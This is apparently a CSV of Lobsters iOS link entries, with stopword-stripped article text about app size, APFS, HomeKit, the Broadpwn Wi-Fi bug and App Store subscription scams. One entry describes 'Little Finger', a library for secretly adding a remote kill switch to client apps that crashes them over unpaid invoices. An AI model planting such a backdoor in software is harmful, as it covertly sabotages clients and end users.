imessage facetime availability real benefit people china seems go largely unrecognized interesting question whether apple selling product china rather whether apple continue make app store way install apps io device fullon install whatever want policy going happen something like gatekeeper macos could keep io app storeonly default add preference setting allow apps downloaded identified developer apple developer certificate addition app store scenario app store longer single choke point native apps device app store envisioned mean apple maintain strict control software running io device totalitarian state like china perhaps russia next becomes source control totalitarian regime expect apple rather deal negative consequence app store choke point give benefit including profit maintaining complete control software angry apple role vpn crackdown china suggest direct anger app store single source thirdparty software
264,Lobsters,ios,Apple iOS,PSA: You Should Not Force Quit Apps on iOS,https://daringfireball.net/2017/07/you_should_not_force_quit_apps,psa force quit apps io,public service announcement force quit apps io short sweet answer craig federighi apple advice use feature update apple store genius bar staff recommending customer perfect example pitting samsung galaxy iphone plus wrote length back fraser mention,public service announcement force quit apps io wednesday july single biggest misconception io good digital hygiene force quit apps using idea apps background locking unnecessary ram consuming unnecessary cpu cycle thus hurting performance wasting battery life io work io system designed none justification force quitting true apps background effectively frozen severely limiting background freeing ram using io really really good good unfreezing frozen app take way le cpu energy relaunching app force quit force quitting apps help actually hurt battery life worse take much longer switch apps force quit apps background short sweet answer craig federighi response email customer asking force quits apps whether preserve battery life official support document forcing application close apple advice use feature doubleclick home button recently used apps appear apps open standby mode help navigate multitask force app close unresponsive update macdailynews quote email steve job use io multitasking designed happy need ever quit apps case believe apple senior vice president software apple official support documentation steve job article pointing habit actually detrimental iphone battery life thing force quitting apps background pernicious myth heard numerous story df reader apple store genius bar staff recommending customer genius anything genius occurs best example proving notion wrong least term performance youtube speed test benchmark entire genre youtube video devoted benchmarking new phone running series apps cpuintensive task repeatedly going loop twice cold boot second time immediately first loop perfect example pitting samsung galaxy iphone plus note apps manually force quit either device iphone easily win first loop iphone really shine second loop relaunch least almost apps android forced quit background reclaim ram using iphone nearly apps reanimate almost instantly fact apps frozen background io unfreeze quickly think actually help perpetuate myth force quit worried background apps draining battery see quickly load background reasonable assumption believe never stopped running really get frozen ram using really get reclaimed system really unfreeze come back life awful lot hard work went making io work like huge technical advantage io hold android every iphone user world habitually force quits background apps manually wasting effort went simultaneously wasting device battery life making everything slower pernicious myth longstanding seemingly die wrote length back like voodoo diehard believer quite certain going receive email people swear upanddown emptying list used application every hour keep iphone running better would otherwise nonsense fraser mention yes exceptional situation app background privilege get stuck need kill app argument never kill app using multitasking switcher argument need regular basis making anything better clearing list shame genius peddling advice even get started people completely power iphones putting back pocket purse
265,Lobsters,ios,Apple iOS,Broadpwn Bug Affects Millions of Android and iOS Devices,https://www.bleepingcomputer.com/news/security/broadpwn-bug-affects-millions-of-android-and-ios-devices/,broadpwn bug affect million android io device,public information available yet researcher reverse engineer android security patch user connect trusted network another flaw broadcom wifi chip,broadcom wifi chip embedded android io device vulnerable bug allows attacker execute code device without interaction needed user bug discovered security researcher nitay artenstein nicknamed broadpwn tracked artenstein reported bug private google included fix issue android security bulletin july released week july public information available yet artenstein disclosed information bug exploit public set give presentation broadpwn year black hat usa security conference held la vega start august detail revealed bug artenstein say broadpwn affect million android io device use broadcom wifi chip handle network communication researcher specifically point finger broadcom family wifi chip included extraordinarily wide range mobile device vendor google nexus samsung htc lg researcher reverse engineer android security patch zhuowei zhang another android security expert reversed engineered android july security patch dig detail broadpwn zhang say bug appears heap overflow firmware broadcom wifi chip researcher say exploitation take place user device receives wme qualityofservice information element malformed length connected network attacker nt need user interaction exploit feature victim need walk attacker wifi network range artenstein later confirmed twitter connecting malicious network necessary user connect trusted network security bulletin google rated broadpwn critical severity issue meaning company view dangerous bug zhang also say broadpwn appears related another flaw broadcom wifi chip discovered google project zero researcher patched april user nt receive month android security patch connect trusted wifi network disable wifi autoconnect feature using one information status bug io device article updated reflect severity level changed medium critical
266,Lobsters,ios,Apple iOS,How to Build Smaller Apps,https://blog.halide.cam/one-weird-trick-to-lose-size-c0a4013de331,build smaller apps,one weird trick lose size halide measure guess app thinning rebuild bitcode use asset catalog run pngcrush pngcrush try jpegs photo time difficult conversation pick right battle avoid library bloat experience similar success good reason avoid library waste resource analytics ab test need aligned goal,one weird trick lose sizepopular social networking apps meg weekly release one year download twenty gig datasince launched halide unexpected compliment heard size meg push le data one year social network push single update using swift asked friend swift bundle standard library app bloating size halide almost entirely swifthow let start technical bit lot review importantmeasure guessexport build xcode choose save ad hoc deployment assuming app support app thinning really point choose export specific device make sure rebuild bitcode checkednot get final representation package size also get app thinning report inspect app package find biggest offendersuse asset catalogskeep asset asset catalog upload app apple slice devicespecific version device screen get asset vice versarun pngcrushbefore putting asset catalog run pngcrush according xcode automatically crush asset pngs outside asset cataloguestry jpegs photosrestrict ui asset similar fine linework pngs probably make asset app photograph experiment jpegs little compression go long wayit time difficult conversationafter hard work shaved megabyte hundred meg behemoth know tell need le codepick right battleshalide line swift includes realtime video processor slew custom control platform controlling avfoundation interesting code writei shaved thousand line boilerplate leveraging auto layout many developer still insist manual layout maybe understand autolayout maybe heard story friend friend autolayout slow seen many especially large invent inhouse layout engine nut bloat app bespoke framework apple bundle fine layout engine oswe could cut another dropping interface builder user manual setting almost entirely ib laid constraint highlevel arrangement camera ui managed similarly decided productivity worth size short termavoid library bloatinspect package many large apps find dozen thirdparty framework weighing anywhere several megabytesi use zero thirdparty library bit extreme bit unique situationthere many thirdparty library need io dev community plethora json mapper nothing lowlevel manipulation dng filesbut video processing mentioned earlier hear shout gpuimage extendable crazy roll experience periscope stack saw significant gain moving gpuimage inhouse solution gpuimage fine realtime image processing part business given long term vision halide role realtime rendering play important componenti never passed gpuimage file size consequence rolling avoided bundling unused filter apppspdfkit similar success replacing larger framework much excited tell pspdfkit io rewrote core digital signature implementation improved detection validation better error reporting result also managed completely drop dependency openssl reducing size binary processdon catch notinventedhere syndrome good reason avoid librariesdon waste resource analytics ab testswe use thirdparty analytics crash reporting service first foremost feel comfortable sending user data advertising company let set aside ideal momentdata free big apps every action record analytics event big apps need logging stuff uniquely identifies user deduplicates request buffer log retries failure etc add upab test even worse typical social network app full dead ab test nobody went back clean upwe set avoid analytics ab test code bloat philosophy around product knowing much data warp mind find optimizing local maximum instead making big bet really move needleso use apple analytics work without code change free respect user privacy requiring optin optin rate fine needsthere time place analytics sure optimal price point may experiment however keeping wall businessdriven analytics product developmentyou need aligned goalswe two man team make money selling product growth entirely organic user happy tell friend u small apps make u happy think make user happyour advice help apps bloat social network make money advertiser advertiser need detailed analytics ad targetingbig apps hundred developer making dozen team independent quarterly goal faster go goal land likely promotionit understandable think library save u week add megabyte app well already hundred megabyte another large organization full reasonable idea unintended consequencessay engineer want move tech ladder shipping feature get promotion building new layout engine company even get recruitingbait engineering blogthe solution senior leadership declaring going slim app unfortunately tech ceo use iphones gig storage live area shoddy speedsthis thankless effort since shipping halide gotten ton message people world grateful effort keeping smallthere really one weird trick lose size focus customer
267,Lobsters,ios,Apple iOS,Making an iOS app small,https://medium.com/@sandofsky/one-weird-trick-to-lose-size-c0a4013de331,making io app small,one weird trick lose size halide measure guess app thinning rebuild bitcode use asset catalog run pngcrush pngcrush try jpegs photo time difficult conversation pick right battle avoid library bloat experience similar success good reason avoid library waste resource analytics ab test need aligned goal,one weird trick lose sizepopular social networking apps meg weekly release one year download twenty gig datasince launched halide unexpected compliment heard size meg push le data one year social network push single update using swift asked friend swift bundle standard library app bloating size halide almost entirely swifthow let start technical bit lot review importantmeasure guessexport build xcode choose save ad hoc deployment assuming app support app thinning really point choose export specific device make sure rebuild bitcode checkednot get final representation package size also get app thinning report inspect app package find biggest offendersuse asset catalogskeep asset asset catalog upload app apple slice devicespecific version device screen get asset vice versarun pngcrushbefore putting asset catalog run pngcrush according xcode automatically crush asset pngs outside asset cataloguestry jpegs photosrestrict ui asset similar fine linework pngs probably make asset app photograph experiment jpegs little compression go long wayit time difficult conversationafter hard work shaved megabyte hundred meg behemoth know tell need le codepick right battleshalide line swift includes realtime video processor slew custom control platform controlling avfoundation interesting code writei shaved thousand line boilerplate leveraging auto layout many developer still insist manual layout maybe understand autolayout maybe heard story friend friend autolayout slow seen many especially large invent inhouse layout engine nut bloat app bespoke framework apple bundle fine layout engine oswe could cut another dropping interface builder user manual setting almost entirely ib laid constraint highlevel arrangement camera ui managed similarly decided productivity worth size short termavoid library bloatinspect package many large apps find dozen thirdparty framework weighing anywhere several megabytesi use zero thirdparty library bit extreme bit unique situationthere many thirdparty library need io dev community plethora json mapper nothing lowlevel manipulation dng filesbut video processing mentioned earlier hear shout gpuimage extendable crazy roll experience periscope stack saw significant gain moving gpuimage inhouse solution gpuimage fine realtime image processing part business given long term vision halide role realtime rendering play important componenti never passed gpuimage file size consequence rolling avoided bundling unused filter apppspdfkit similar success replacing larger framework much excited tell pspdfkit io rewrote core digital signature implementation improved detection validation better error reporting result also managed completely drop dependency openssl reducing size binary processdon catch notinventedhere syndrome good reason avoid librariesdon waste resource analytics ab testswe use thirdparty analytics crash reporting service first foremost feel comfortable sending user data advertising company let set aside ideal momentdata free big apps every action record analytics event big apps need logging stuff uniquely identifies user deduplicates request buffer log retries failure etc add upab test even worse typical social network app full dead ab test nobody went back clean upwe set avoid analytics ab test code bloat philosophy around product knowing much data warp mind find optimizing local maximum instead making big bet really move needleso use apple analytics work without code change free respect user privacy requiring optin optin rate fine needsthere time place analytics sure optimal price point may experiment however keeping wall businessdriven analytics product developmentyou need aligned goalswe two man team make money selling product growth entirely organic user happy tell friend u small apps make u happy think make user happyour advice help apps bloat social network make money advertiser advertiser need detailed analytics ad targetingbig apps hundred developer making dozen team independent quarterly goal faster go goal land likely promotionit understandable think library save u week add megabyte app well already hundred megabyte another large organization full reasonable idea unintended consequencessay engineer want move tech ladder shipping feature get promotion building new layout engine company even get recruitingbait engineering blogthe solution senior leadership declaring going slim app unfortunately tech ceo use iphones gig storage live area shoddy speedsthis thankless effort since shipping halide gotten ton message people world grateful effort keeping smallthere really one weird trick lose size focus customer
268,Lobsters,ios,Apple iOS,John Markoff Interviews Original iPhone Engineering Team Members and Scott Forstall,https://www.macstories.net/news/john-markoff-interviews-original-iphone-engineering-team-members-and-scott-forstall/,john markoff interview original iphone engineering team member scott forstall,computer history museum left company unlock macstories extra extra macstories content join club macstories weekly macstories unplugged monthly log access,last night computer history museum mountain view california hosted twotwo hour interview program event split two part first half interview moderated john markoff spoke former iphone team member hugo fiennes nitin ganatra scott herz development original iphone three engineer recount like recruited secret project detail team effort bring phone market second half program begin video oneonone interview markoff scott forstall led software development iphone interview scott forstall first public comment iphone apple since left company cover broad range topic early iphone prototype demonstrating iphone cingular first carrier offer phone interview segment full entertaining anecdote iphone development well worth watching anyone interested took create iphone forstall particularly engaging storyteller displaying enthusiasm excitement used show onstage apple keynote video unlock macstories extrasclub macstories offer exclusive access extra macstories content delivered every week also way support u directly club macstories help discover best apps device get iphone ipad mac also give access advanced io shortcut tip trick lot starting annual option available join club club macstories membership includes macstories weekly newsletter delivered every week friday app collection tip io workflow macstories unplugged podcast published monthly discussion working monthly log newsletter delivered every month behindthescenes story app note personal journal access occasional giveaway discount free downloads
269,Lobsters,ios,Apple iOS,Our dirty little secret: Cross-platform email client with nothing but HTML,https://medium.com/missive-app/our-dirty-little-secret-cross-platform-email-client-with-nothing-but-html-aa12fc33bb02,dirty little secret crossplatform email client nothing html,dirty little secret crossplatform email client nothing html amazingly fast receiving review featured apple missive android io counterpart responsive http react native cs u http githubengineeringcomhowfournativedeveloperswroteanelectronapp favorite browser native wrapper,dirty little secret crossplatform email client nothing htmlamazingly fast receiving review featured appletoday released missive android week ago io counterpart writing featured apple new apps love section app store u canada knowledge oh love however one big terrible shocking secret responsive phonegap app bundle exact code desktop sink init feel incredibly native thought especially phonegap dead water apparently particularly proud stack would love elaborate little bit clientside missive desktop apps built top electron mobile apps top phonegap core missive react backbone app written coffeescript welcome year ago right yup exactly development began day still feel like changing would make app better waywhy react native noticed emphasis responsive context menu full screen nativelike navigation cssit csshappen desktop touch screen even better get full touch ux unmatched unprecedented technologyswiping chrome device toolbar enabledso fact little bit hassle copy pretty much native behaviour htmlcss react native really came one bundle rule advantage u react native would make sense missive mobile app case afford maintain one code base per platform mobile v desktop mean bug le feature coverage usone focusing backend one frontend one allstar allaround guy said review everyone else code whether area expertise needle say time focus scarce resource around pick fight carefully always aim long run would taken different path team maybe would mistake definitely think web leanest pragmatic way go app ambitious missiveas turn building native apps multiple platform githubengineeringcomhowfournativedeveloperswroteanelectronappfocusing sole code base give u opportunity good one area instead struggling keep every code base sync without even realizing perfect different layout size ipad pro split view example come free using build platform going web whether using missive favorite browser device one native wrapper fullfeatured experience
270,Lobsters,ios,Apple iOS,Apple‚Äôs App Store Guidelines Now Allow Executable Code in Educational Apps and Developer Tools,https://www.macstories.net/linked/apples-app-store-guidelines-now-allow-executable-code-in-educational-apps-and-developer-tools/,apple app store guideline allow executable code educational apps developer tool,rule also provides,apple made several change app store review guideline wwdc week including easing prohibition downloading executing code io device ban executable code remains intact rule also provides apps designed teach develop test executable code may limited circumstance download code provided code used purpose apps must make source code provided application completely viewable editable user change guideline limited important signal thirdparty developer apple accept certain educational apps developer tool io brings promise app development io one step closer reality
271,Lobsters,ios,Apple iOS,WWDC 2017 Update: Significant Updates to Location Permissions Coming With iOS 11,https://m.rover.io/wwdc-2017-update-significant-updates-to-location-permissions-coming-with-ios-11-41f96001f87f,wwdc update significant update location permission coming io,wwdc update significant update location permission coming io coming io never use always,wwdc update significant update location permission coming io wwdc io see latest information regarding location permissionsat wwdc today apple provided update significant implication developer app publisher working locationbased marketing attribution change fundamentally alter way io developer app publisher able access differing level location permission mobile appsthis request always appears io recent update coming io september app publisher option requesting user optin location permission always app publisher always access user location use app publisher visibility user location app open running foreground developer could choose permission set wanted request obligated offer boththis meant publisher could effectively force user granting always permission providing option use rendering apps rely location uber lyft effectively useless without always permission levelin addition uberstyle use case always permission requisite delivering beacon geofence based push notification type notification essentially wake sleeping app background prompting user open app notification come range beacon enter geofence app monitoring background without always permission level locationbased notification possiblewhat coming io request always new locationpermission rule user automatically given three option open app requesting location first time unlike previous io version developer could choose permission wanted request option must appear mandatory location permission option never use always force app publisher providing user choice rather alwaysornothing scenario described
272,Lobsters,ios,Apple iOS,"How to Make $80,000 Per Month on the Apple App Store",https://medium.com/@johnnylin/how-to-make-80-000-per-month-on-the-apple-app-store-bdb943862e88,make per month apple app store,make per month apple app store far easier think luck perseverance necessary step follow money step duplicitous behavior app need cccess contact scan contact first contact cleaned dupplicated found full virus malware scanner pay subscription month subscription reroute internet traffic scammer step starting ad profit subscription automatically renewing really imagine one techilliterate relative accidentally even intentionally subscribing free trial protect ipad virus isolated incident app fixing app store check disable subscription refund contact u fixing app store apple remove scam refund user better ui touch id subscription stricter review subscription one prompt delete subscription app deletion easier cancellation subscription nine step process unable refund fraud abuseproof search ad fine take legal action final note privacy review,make per month apple app storeit far easier think luck perseverance necessaryat wwdc apple reported paid billion developer billion last year huge spike surprising seem like friend spending apps last year anecdotal wondered revenue coming opened app store browse top grossing appsstep follow moneyi scrolled list productivity category saw apps wellknown company like dropbox evernote microsoft expected top grossing productivity app june app called mobile protection clean security vpn given terrible title app inconsistent capitalization misplaced colon grammatically nonsensical clean security vpn sure bug ranking algorithm check sensor tower estimate app revenue per month possibly right really curiousi tap app detail see developer ngan vo thi thuy wait vpn service offered independent developer even bother incorporate company huge red flag know bad vpn basically route internet traffic third party server case random person piece together grammatically correct title also bother incorporate company want access internet trafficanother red flag comically terrible app description direct screenshot mobile protection clean security vpn app descriptionaccording mobile protection clean security vpn full feature well certainly full something apparently mobile protection includes protecting dupplicate contact scan screenshots claim quick full scan internet security five internet anyone figure relationship internet security duplicate contactsall red flag even downloaded app yet check review tab find vague fakelooking review seeing date review brought another question long app well according sensor tower mobile protection clean security vpn top grossing productivity app since least april almost month step duplicitous behaviorout curiosity supposedly top grossing app download happens open first time yes app need cccess contact scan contact first option tap agree io asks want give app cccess contact uhm thank skipping app tell device risk course also ready device analyze quick full scan secure internet wait tapping device analyze show iphone free memory storage useless irrelevant featuretapping quick scan full scan show contact cleaned dupplicated found oh good duplicate except extra p dupplicated guess let finally secure internet tapping secure internet hmm play without installing oh boy come incredibly generous offer play bubble shooter game without installing sure deserve amazing free gift wait tap x return securing internethere next screen generous much design scamand obviously jump opportunity instantly use full smart antivirus tapping free trial free alltouch id okay let read fine print full virus malware scanner pretty sure impossible app scan iphone virus malware since third party apps sandboxed data let keep pay subscription come buried third line paragraph text small font io casually tell laying finger home button mean agree start subscription per week one touch id away month subscription reroute internet traffic scammer guess lucky actually read entire fine print people step starting ad profitit suddenly made lot sense app generates month per subscriber need scam people make year amount apple take one appat point might still disbelief maybe thinking sure people still seems highly unlikely even one person would download scammy looking app much le pay maybe download certainly also never clicked google ad yet google somehow rode adwords billion dollar today mobile protection clean security vpn currently ranked downloaded free productivity apps app store estimated downloads aprilto get subscriber downloads need convert purchase maybe even fewer subscription automatically renewing subscriber stack month month really imagine one techilliterate relative accidentally even intentionally subscribing free trial protect ipad virus app get downloads first place remembered reading large percentage apps discovered app store search maybe app somehow really good app search optimization searched app store virus scanner first result ad protection iphone mobile security vpn well sound familiar app one inapp purchase free trial premium protection ranked top grossing business categoryturns scammer abusing apple relatively new immature app store search ad product taking advantage fact filtering approval process ad ad look almost indistinguishable real result ad take entire search result first pagelater dug deeper find unfortunately isolated incident fairly common app store top grossing list happening security related keywords seems like scammer bidding many keywords search wifi top result ad wep password generator simple random string generator charge already making per month despite released april likely clone app indicates yes scheme become large scammer copying otherfixing app store dowell first reading developer also happens lessthanaverage sense morality congratulation learned relatively easy way make ten thousand dollar apple app store least change something otherwise suggestion teach le techsavvy friend relative check disable subscription affected get refundsreport scam apps see itunes connect contact u form select feedback concern report fraud concern signal boost apple fix clicking heart icon recommend bottom article sharing fbtwitterfixing app store apple doit somewhat hard believe apple aware problem since apps small fry top list app store could simply consider big enough problem deal happens profitable problem search ad app store platform either way suggestion remove scam refund user obvious simply hire someone proactively regularly scroll top apps remove scam tell hard spot people purchased scam subscription automatically fully refund past purchasesbetter ui touch id subscription use small fine print price buried text see free trial screenshot price much prominent possibly required delay purchase made bonus maybe show app usefulrecent rating review herestricter review subscription inapp purchase called full virus malware scanner get approved app review per month anyone home layperson see name email receipt slick green badge icon probably cancel look official apple music receipt apps like one despite inapp purchase named free trial premium trial immediate purchaseprompt delete subscription app deletion many reviewer scam apps said getting charged even though deleted app people way work work way user deletes app ask user want also cancel subscription course confirm accidentally cancel netflixeasier cancellation subscription subscription difficult cancel almost designfocused apple intentionally made hard io cancelling subscription literally nine step process even installing thirdparty keyboard easier six step make simpler please tiny report problem button email receipt enough update actually unable refund one scam subscription even official apple link fraud abuseproof search ad part make scam easy run new store search ad many regular user probably even know clicking ad least apple review ad potential fraud running facebook google make obvious top result adfine take legal action suggestion last unlikely apple currently incentive build scam apps worst happen getting account deleted matter still keep illgotten profit still make new account create deterrent effect fining taking legal action worst offendersfinal noteapp developer take pride fact creation add value improves people life way people happy pay everybody benefit making good apps requires design engineering sale skill well ton dedication hard workso aside obvious moral wrong exploiting vulnerable profit extremely disheartening know developer becoming financially successful easy unethical way making bogus apps take hour code whose functionality purely steal le wellinformedif anyone apple reading please right thingupdate received incredible user response story reviewing privacy topranked apps app store new site privacy review privacyreviewco new review added every week
273,Lobsters,ios,Apple iOS,Apple will now let hobbyists build their own HomeKit devices,https://www.theverge.com/2017/6/8/15761800/apple-homekit-updates-ios-11-easier-build-requirements-wwdc-2017,apple let hobbyist build homekit device,notable change say correction june et,though apple nt much say homekit keynote presentation monday turn company smart home system seeing notable change year update center two thing making homekit flexible user making much easier developer start building new product second arguably bigger deal anyone wanted create homekit product join apple licensing program get started big hurdle removed apple allow registered developer start building homekit device forbes say devs even put something together using raspberry pi arduino one big catch homekit device built way without official certification wo nt able go sale meant development personal use hobbyist build homekit device still allow hobbyist build smart home gadget integrate io pretty cool make much easier developer thinking building product homekit get started mean could see company building compatible device apple also making one big change simplify development longer requiring every homekit device contain specific security chip instead allow company authenticate device entirely using software smart home device market already support homekit even able use method add homekit support io launch fall make life easier homekit device manufacturer general homekit mostly unique among smart home system requiring device contain specific chip complicating hardware development allowing manufacturer software homekit much easier implement alongside compatibility service like alexa smartthings wink meaningful one reason homekit authentication chip cost software method device manufacturer still go full certification process want sell anything get charged apple along way may previously discouraged company participating homekit also mean apple giving source revenue order spark bigger ecosystem device apple adding new device category trigger top update make building homekit device easier apple also expanding homekit way consumer notice adding two new category supported product sprinkler faucet adding bunch new way trigger action home one simpler update favorite mine enhancement sunrise sunset trigger offset amount time could instance lamp home turn shortly sun go night apple adding temperature trigger event kicked temperature go certain point getting better tracking people house track specific people instead individual device use better tell someone leaf arrives home io allow homekit user set thing happen last person leaf house someone arriving home empty house also way temporarily turn certain device apple gave example opening door night outside light turn minute instead turning staying currently still pretty basic stuff show apple continuing chip away lowlying smart home problem steadily making device much useful way augment home correction june et apple clarified software authentication method include sort licensing fee story also initially stated sunrise sunset trigger new fact timing offset new
274,Lobsters,ios,Apple iOS,Apple Removes Facebook and Twitter Integration From iOS 11,https://daringfireball.net/linked/2017/06/06/facebook-twitter-ios-11,apple remove facebook twitter integration io,,special treatment twitter facebook always seemed little weird feel right io apps tuesday june
275,Lobsters,ios,Apple iOS,APFS is currently unusable with most non-English languages,https://eclecticlight.co/2017/04/06/apfs-is-currently-unusable-with-most-non-english-languages/,apfs currently unusable nonenglish language,apfs currently safe use name might unicode normalisation issue mean safe limited ascii character set partly normalise advice developer expressed concern enter command line script script multiply simple solution postscript casesensitive caseinsensitive article like,time come test fear problem file folder name apple new filing system apfs tl dr apfs currently safe use name might unicode normalisation issue mean safe limited ascii character set shown bizarre screen shot partly normalise read previous post quick recap nub problem knowledgeable regular skip ahead next section unicode contains vast number character many different unicode number fact character simple example letter eacute represented √© encoding two hex byte three hex byte cc font may small difference case see identical character expect computer treat four system provided unicode standard currently mac extended file system hf us normalisation form nfd √© automagically converted represented three byte cc hf done file system level mean everything run mac matter whether app shell command terminal macos work normalised file folder name hf prevents anything creating nonnormal name apple new file system apfs already running io device use io later perform normalisation respect whatever unicode character used whether normalised instead normalisation built higherlevel system command work file folder apple advice developer therefore avoid introducing bug code mismatched unicode normalization filename use highlevel foundation apis nsfilemanager nsurl interacting filesystem use filesystemrepresentation property nsurl object creating opening file lowerlevel filesystem apis posix open storing filename externally filesystem others already expressed concern software follow perhaps nature call make yet supported highlevel apis thus feel potential bug arise running apfs risk happening greater unenglish language used normalisation affect language regular english least switching file system always normalises one leaf operating system app developer handle would thus lead mixed partial normalisation prove problem enter command line script hf normalises file system level command shell terminal etc normalise afford file system normalise otherwise would able access file folder normalised name well app seeing file normalised name command tool must able see work file folder access permission used terminal current apps apfs volume convinced currently happens little short catastrophic unexpectedly break sort tool including use command shell script possibly many property list file used configure launch agent demon reason command run terminal otherwise apfs volume undergo normalisation file directory name strange quirk fate normalisation form chosen apple hf nfd us unicode character least accessible keyboard type terminal touch caf√©txt name file created us nonnormalised character eacute however higherlevel call used finder apps work apple promise using normalisation file name appears finder window disappears icon view name nonnormalised save file app using name name undergoes normalisation instead creating file name caf√©txt creates file name although latter may look identical listed terminal us different unicode character terminal see two file folder name apparently identical consisting different unicode character distinguish however finder know two file icon view show one try open either file using app us higherlevel normalising call app open one bearing normalised name try open filename normalised always open normalised name trash file normalised name leaving one nonnormalised character app see try open report error code telling file exist tried open file normalised name longer trash file nonnormalised name app finder happy however type terminal command say delete rm caf√©txt pas nonnormalised name normalised one return error rm caf√©txt file directory however know keyboard combination enter eacute character filename delete file explicitly would resort pattern caf txt instead worst problem without using new free tool apfelstrudel see downloads almost impossible tell difference name appear identical eye script multiply command passed shell directly used extensively across macos filename path used currently hf normalised hf reach target set tool usrlocalbincaf√© run demand ambiguity command tool refers apfs potential almost invisible error occur great amplified fact case unicode character type keyboard character normalised simple solution one possible solution might apply normalisation file folder name command shell although would appear technically hard implement however would deprive command tool access file path used nonnormalised name would cause major issue moment anything created file path including nonnormalised unicode character feasible shell could sort escape option perhaps putting name double quote passed without normalisation however would break large number existing script call major compatibility issue way similarity issue casesensitivity file folder name apple already discovered thorny amused highlevel call io work prevent case clash even though io us used casesensitive file system hf apfs big difference casesensitivity see upper lower case quite clearly without tool apfelstrudel see difference normal nonnormal form turn nasty problem complete chaos using apfs accented nonroman character like kissed wearing blindfold time pleasant every really regret postscript see discussion comment primarily apply casesensitive variant apfs since looked detail caseinsensitive variant present set problem discussed article currently appears default variant apfs used macos high sierra caseinsensitive one lessen problem least although apple still maintains apfs normalise filename way hf added june like like loading related
276,Lobsters,ios,Apple iOS,WWDC June 2017,https://www.apple.com/apple-events/june-2017/,wwdc june,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
277,Lobsters,ios,Apple iOS,"Little Finger, a library to add a kill switch to your mobile apps",http://avi.im/little-finger/,little finger library add kill switch mobile apps,little finger anonymous quora answer work http status code default behaviour quick instruction io android detailed instruction little finger server swift repo readme android repo readme demo io android heroku name petyr baelish license mit license,little finger little finger set simple serverclient library let add backdoor androidios app easily single line code project based anonymous quora answer say freelancer often must faced really bad client vanish without paying money promised using little finger crash app remotely client vanishes receive money make app work expected work little finger come server component client library make call server based response http status code received take action money received let work expected never make another call server however money received crash app server also send local push notification app display take one line code start little finger start everytime appdelegate didfinishlaunchingwithoptions swift mainactivityoncreate android http status code following http status code used server sends httppaymentrequired httpok payment expected receive litte finger let app work usual little finger keep calling server everytime started know status payment server sends httpaccepted payment received little finger update app preference future network call made server sends httpconflict payment received conflict little finger receives crash app server also notification data little finger us display local notification crashing creative send notification text saying million dollar spammy message make matter worse default behaviour internet available app fails make http call app crash server sends response app continues work expected heroku app app fails reach app continue work expected heroku sends little finger fully open source free fork modify behaviour per taste quick instruction install server heroku click deploy heroku button bottom give response status code include little finger calling code app io littlefingerstart http yourherokuappherokucomstatus android littlefingerstart http yourherokuappherokucomstatus received payment conflict update heroku app environment variable usually located http dashboardherokucomappsyourherokuappsettings config variable accordingly detailed instruction little finger server written clojure come one click heroku deploy located bottom click server installation swift check swift repo readme detailed installation instruction android check android repo readme detailed installation instruction demo simple crude demo apps io android heroku name name little finger come grrm song ice fire character petyr baelish license library server released mighty mit license please check license file respective repository detail
278,Lobsters,ios,Apple iOS,App Development with Swift,https://itunes.apple.com/us/book/app-development-with-swift/id1219117996?mt=11,app development swift,,let get one thing straight resource invaluable amazing wonderfully repeat wonderfully put together senior college experience programming textbook clearer fact teaching u build apps make even difficult build textbook creating apps difficult author need lot handholding almost teach u like training wheel great job whole new language take lot teach especially many people clearly seem like need handholding bad thing obvious observation people continue complain obviously nitpicking overreacting merely distracted obvious use resource bring io app building world common personwho know code stop complaining god take book run wealth knowledge read learn code nt read find aesthetically pleasing eye kind font use etc seriously giving information free building mobile software take happy complaining nt work iphone coding meant learned iphone get laptopcomputer setup proper environment practice way learn anything taking minute day read book iphone need practice practice computer using xcode mean come went school know homework really matter reading textbook another thing care error take away quality app mean tell build entire interactive ibook io coding let sit reviewed whole year nitpick tiny error book could sent mass earlier people benefit everyone make mistake even software engineer stop complaining give book deserves time patience applause come onwho else create something large make interactive quiz lab downloaded coding project etc book amazing download please like others complaining enjoy wonderful book learned soooo much couple day way apps work complex book break beautifully even give insight favorite apps period comment necessary wo nt even edit review
279,Lobsters,ios,Apple iOS,What If the iPad Smart Keyboard Had a Trackpad?,https://daringfireball.net/2017/05/ipad_trackpad,ipad smart keyboard trackpad,ipad smart keyboard trackpad latest episode talk show david chapman took idea made quick mockup might look like two year ago steven troughtonsmith discovered incomplete version uifocusengine built io original mac even arrow key keyboard stephen coyle came different idea,ipad smart keyboard trackpad wednesday may idea tossed latest episode talk show talking jim dalrymple apple might ipad pro added trackpad smart keyboard david chapman took idea made quick mockup might look like think trackpad smaller mockup like older macbook new macbook image conveys general idea talking adding onscreen mouse cursor io clicking dragging terrible idea loose idea ipad trackpad based thing io trackpadlike mode using onscreen keyboard move insertion point around like mouse cursor editing text lot people know feature misunderstand one favorite addition io recent year iphone touch editing text hard press keyboard turn trackpad moving insertion point around text editing area mode hard press change moving insertion point selecting word like doubleclickthendrag macos ipads yet touch access mode putting two finger onscreen keyboard dragging twofinger touch keyboard drag right away move insertion point twofinger touch keyboard wait moment insertion point change barbell drag select word tvos uifocusengine interface framework allows apple tv controlled trackpad game controller without onscreen mouse cursor apple tv move cursor around move selection around two year ago steven troughtonsmith discovered incomplete version uifocusengine built io thing stand today using ipad hardware keyboard selecting text moving insertion point around stink yes use arrow key keyboard along shortcut like option move wordbyword instead characterbycharacter shift select go seems like regression encourage entirely keyboardbased routine text editing original mac even arrow key keyboard force user use mouse moving insertion point short using ipad onscreen keyboard crummy least subpar keyboard typing nice interface moving insertion point around using smart keyboard hardware keyboard decent keyboard typing good way move insertion point select text using finger touch screen imprecise ipad propped laptopstyle ergonomically undesirable hardware keyboard trackpad could good interface moving insertion point selecting text software keyboard even better really since use two finger start touch force press trackpad would make feature discoverable awful lot ipad owner probably know twofinger drag feature onscreen keyboard editing text trackpad might much ipad entire point smart keyboard writing editing text connected using prop ipad watching video something think trackpad could used selecting thing changing input focus home screen could use trackpad select app launch like apple tv splitscreen multitasking mode could use multitouch gesture trackpad switch pane focus twofinger drag trackpad could scroll current view much like mac fully admit perfect idea think would greatly improve efficiency text editing ipad text editing essential task ipad user understand apple bothered making smart keyboard first place unlike adding touchscreen support macos adding trackpad support io would harm anything good way thing already biggest problem entire notion way smart keyboard fold cover keyboard would redesigned current design leaf room trackpad proposing might possible hard nonfolding keyboard cover stephen coyle came different idea key smart keyboard low profile easy one finger glide mind make entire top surface keyboard touch sensitive use way software keyboard needed way toggle trackpad mode think perfect opportunity ditch cap lock key replace trackpad mode key held using one finger move cursor reason think approach would better discrete trackpad first requires extra space major change current design second mentioned 